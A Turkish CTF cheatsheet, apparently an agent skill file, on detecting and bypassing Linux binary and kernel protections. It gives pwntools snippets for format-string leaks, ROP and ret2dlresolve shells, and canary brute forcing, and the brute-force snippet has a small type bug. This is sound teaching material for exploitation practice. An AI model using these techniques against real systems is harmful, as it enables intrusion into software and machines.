# Modern Binary Proteksiyonlar — Tespit ve Bypass Cheatsheet

Modern Linux pwn challenge'larında karşılaşılan tüm güvenlik mekanizmaları, tespit yöntemleri ve atlatma teknikleri. `checksec --file=./binary` çıktısı bu tabloyla okunur.

---

## Proteksiyon Matrisi

| Proteksiyon | Tespit | Etkisi | Bypass Yöntemleri |
|---|---|---|---|
| **NX (No-Execute)** | `checksec` → `NX enabled` | Stack/heap'te shellcode çalışmaz | ROP, ret2libc, ret2dlresolve, JIT spray |
| **ASLR** | `cat /proc/sys/kernel/randomize_va_space` | Libc/stack/heap rastgele | Info leak (puts(puts@got)), ret2csu + PIE leak |
| **PIE** | `checksec` → `PIE enabled` | Binary base rastgele | PIE leak (return address sızdır), partial RELRO overwrite |
| **Stack Canary** | `checksec` → `Canary found` | Stack BOF tespit | Canary leak (format string, byte-by-byte brute), fork servers'da byte brute |
| **Full RELRO** | `checksec` → `Full RELRO` | GOT yazılamaz | GOT overwrite ipi geç — `__free_hook`, `__malloc_hook`, FILE struct |
| **Partial RELRO** | `checksec` → `Partial RELRO` | .got.plt yazılabilir | GOT overwrite (puts → system) |
| **Fortify Source** | `checksec` → `FORTIFY enabled` | strcpy/sprintf checks | Doğrudan write yerine indirekt yol, bypass farklı sembolle |
| **CET / IBT** | `readelf -n binary \| grep "IBT\|SHSTK"` | Indirect branch hedefleri ENDBR64 olmalı | Sadece ENDBR64 başlayan gadgets kullan |
| **MPK (Memory Protection Keys)** | `cat /proc/cpuinfo \| grep pku` | Sayfa bazlı korumalı bellek | `pkey_mprotect` syscall, kontrol akışı pkey'i 0'la |
| **SafeStack / ShadowStack** | Clang SafeStack: ayrı stack | Return adresleri ayrı stackte | Stack pivot ile shadowstack'i değiştir (zor) |
| **Seccomp** | `seccomp-tools dump ./binary` | Syscall whitelist/blacklist | İzinli syscall'larla ORW shellcode, `open+sendfile` |
| **KASLR** | `cat /proc/cmdline \| grep kaslr` | Kernel base rastgele | `prctl` leaks, `/proc/kallsyms` (cap_sys_admin), modprobe_path |
| **SMEP** | `cat /proc/cpuinfo \| grep smep` | Kernel kullanıcı sayfasında kod çalıştıramaz | KROP (kernel ROP), gadget'lar kernel imajında |
| **SMAP** | `cat /proc/cpuinfo \| grep smap` | Kernel kullanıcı sayfasından okuma/yazma yapamaz | `stac/clac` gadget, copy_from_user, fizik bellek pivot |
| **KPTI** | `dmesg \| grep "page table isolation"` | Kernel/user page tables ayrı | Tek başına sorun yok, ret2usr ile birleşmesin |

---

## checksec Hızlı Okuma

```bash
# Standart bash one-liner
checksec --file=./binary --format=cli

# pwntools ile Python'dan
from pwn import ELF
e = ELF('./binary')
print(e.canary, e.nx, e.pie, e.relro)
```

Tipik çıktı:
```
RELRO    STACK CANARY      NX     PIE       BINARY
Partial  No canary found  NX en  No PIE    ./vuln
```

Bu = en kolay senaryo: BOF + ret2libc, PIE yok → base biliniyor, RELRO partial → GOT overwrite mümkün.

---

## ASLR Bypass Stratejileri

### 1. Format String ile Leak
```python
# %p ile stack leak
io.sendline(b'%p ' * 20)
leaks = io.recvline().split()
# Libc adresleri 0x7f ile başlar → onu bul
libc_leak = next(int(x, 16) for x in leaks if x.startswith(b'0x7f'))
```

### 2. ret2csu + puts(puts@got) Leak
```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
# Stage 1: leak libc
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])  # return to main for stage 2
payload = b'A'*offset + rop.chain()
```

### 3. ret2dlresolve (No libc info needed)
```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.call('read', [0, dlresolve.data_addr])
rop.ret2dlresolve(dlresolve)
```

---

## Canary Bypass

### Fork Server'da Byte-by-Byte Brute
```python
# Her byte 256 deneme; canary 8 byte → 2048 deneme toplam
canary = b'\x00'  # canary her zaman \x00 ile başlar
for pos in range(7):
    for byte in range(256):
        guess = canary + bytes([byte])
        payload = b'A'*offset + guess
        io.send(payload)
        if 'stack smashing detected' not in io.recvline():
            canary = guess
            break
```

### Format String ile Canary Leak
```python
# Canary genelde stack'in 7. veya 11. argümanı (mimari bağımlı)
io.sendline(b'%17$p')  # 17. arg'ı leak et
canary = int(io.recvline().strip(), 16)
```

---

## CET/IBT Bypass

Tüm indirect jump/call hedeflerinde `endbr64` (4 byte) olmalı. ROP gadget'ları bunu sağlamalı:

```bash
# IBT-compatible gadget bul
ROPgadget --binary ./vuln | grep "endbr64"
```

Tipik IBT-uyumlu gadget:
```asm
endbr64
pop rdi
ret
```

---

## Tam Otomatik Tespit Scripti

```bash
#!/bin/bash
# triage.sh — binary'i hızlıca analiz et
B=$1
echo "=== File ==="
file $B
echo "=== Checksec ==="
checksec --file=$B
echo "=== Libc ==="
ldd $B
echo "=== Strings (interesting) ==="
strings $B | grep -E '(/bin/sh|system|gets|strcpy|format|flag)'
echo "=== ASLR ==="
cat /proc/sys/kernel/randomize_va_space
echo "=== Seccomp? ==="
which seccomp-tools && seccomp-tools dump $B
```

---

## İlgili Skill'ler

- `skills/ctf/pwn/buffer-overflow-rop/SKILL.md` — Klasik BOF + ROP
- `skills/ctf/pwn/ret2libc/SKILL.md` — Libc leak + system shell
- `skills/ctf/pwn/srop-attack/SKILL.md` — Sigreturn-based ROP
- `skills/ctf/pwn/heap-exploit/SKILL.md` — Heap'te GOT/hook overwrite
- `skills/ctf/pwn/seccomp-sandbox-escape/SKILL.md` — Seccomp filtreyi atlatma
